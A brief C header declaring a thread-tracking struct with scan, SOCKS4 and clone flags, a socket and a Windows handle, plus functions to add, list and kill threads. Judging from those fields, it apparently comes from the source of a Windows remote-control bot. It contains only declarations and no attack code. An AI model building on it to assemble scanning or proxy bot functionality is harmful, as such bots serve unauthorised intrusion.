struct threads
/* stores thread information */
{
	char name[64];
	char desc[128];
	bool scan;
	bool socks4;
	bool clone;
	SOCKET csock;
	HANDLE handle;
};

int addthread(const char *name, const char *desc);

int numthread(const char *name);

void listthreads(const char *target);

void killthread(const char *name);

void killthreadid(int tnum);

void killthreadall();

void clearthread(int tnum, bool close = true);

void clearthreadall();
